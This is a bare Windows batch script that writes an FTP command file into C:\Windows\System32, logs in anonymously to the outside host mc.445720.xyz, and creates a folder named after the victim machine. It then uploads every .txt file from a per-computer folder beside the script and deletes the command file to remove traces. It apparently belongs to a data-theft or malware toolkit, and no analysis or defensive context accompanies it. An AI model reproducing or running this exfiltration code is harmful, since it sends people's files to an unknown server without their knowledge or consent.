cd C:\Windows\System32
Echo open mc.445720.xyz >ftp.up
Echo anonymous>>ftp.up
Echo testpassword>>ftp.up
Echo Cd Ping-data-logo >>ftp.up
Echo mkdir %computername% >>ftp.up
Echo cd %computername% >>ftp.up
Echo prompt >>ftp.up
Echo mput "%~dp0\%computername%\*.txt">>ftp.up
Echo bye>>ftp.up
FTP -s:ftp.up
del ftp.up /q